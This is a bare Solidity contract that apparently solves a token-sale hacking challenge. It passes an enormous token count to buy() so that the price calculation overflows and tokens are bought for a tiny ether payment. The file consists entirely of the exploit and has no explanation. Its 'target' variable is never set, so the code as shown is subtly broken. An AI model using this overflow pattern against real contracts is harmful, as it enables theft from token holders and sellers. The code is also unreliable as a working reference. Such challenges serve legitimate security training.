pragma solidity ^0.4.21;

interface ITokenSaleChallenge {
    function buy(uint256 numTokens) external payable;
}

contract Attacker {
    ITokenSaleChallenge target;

    function Attacker() public payable {}

    function attack() public {
        uint256 numTokens = 115792089237316195423570985008687907853269984665640564039458;

        target.buy.value(415992086870360064 wei)(numTokens);
    }

    function() external payable {}
}
